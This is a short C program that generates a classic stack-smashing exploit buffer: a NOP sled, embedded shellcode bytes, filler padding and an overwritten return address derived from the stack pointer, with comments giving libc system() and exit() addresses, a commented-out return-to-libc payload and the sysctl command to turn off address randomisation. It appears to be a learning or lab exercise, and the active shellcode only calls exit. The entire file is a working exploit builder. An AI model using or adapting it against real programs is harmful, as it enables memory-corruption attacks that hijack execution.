#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/**
 * Example of inject c code
 * libc - system add : 0x7ffff7e2bcd0
 * libc - exit : 0x7ffff7e213c0
 * shell env : 0x7fffffffe01b
 * disable randomize stack sudo sysctl -w kernel.randomize_va_space=0
 */

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 512
#define NOP 0x90

// char shellcode2[] =
//     "\xb8\x01\x00\x00\x00"
//     "\xbb\x05\x00\x00\x00"
//     "\xcd\x80";

// char shellcode[] =
//     "\xd0\xbc\xe2\xf7\xff\x7f" // system()
//     "\xc0\x13\xe2\xf7\xff\x7f" // exit()
//     "\x1b\xe0\xff\xff\xff\x7f";

unsigned char shellcode[] = "\xb0\x01"
                            "\xb3\x05"
                            "\xcd\x80";

unsigned long *
get_sp(void)
{
    __asm__("mov %rsp, %rax");
}

int main(int argc, char *argv[])
{

    char *buff, *ptr;
    unsigned long *addr_ptr, addr;
    int offset = DEFAULT_OFFSET, bsize = DEFAULT_BUFFER_SIZE;
    int i;
    size_t shellcode_len = strlen(shellcode);

    if (argc > 1)
        bsize = atoi(argv[1]);
    if (argc > 2)
        offset = atoi(argv[2]);

    if (!(buff = malloc(bsize + 9)))
    {
        printf("Can’t allocate memory.\n");
        exit(0);
    }

    addr = get_sp() - offset;
    fprintf(stderr, "Size of PTR: %ldb\n", sizeof(unsigned long *));
    fprintf(stderr, "Using address : 0x%lx\n", addr);
    fprintf(stderr, "Shell code len %lu\n", shellcode_len);
    ptr = buff;
    addr_ptr = (unsigned long *)ptr;
    // add noop instruction
    for (i = 0; i < bsize / 2; i++)
        *(ptr++) = NOP;
     // add shellcode
    for (i = 0; i < shellcode_len; i++)
        *(ptr++) = shellcode[i];
    // add padding
    for (i = 0; i < (bsize - (bsize / 2) - (shellcode_len)); i++)
        *(ptr++) = 'A';
    
    // add jmo address
    *((unsigned long *)ptr) = addr;
    printf("%s", buff);
}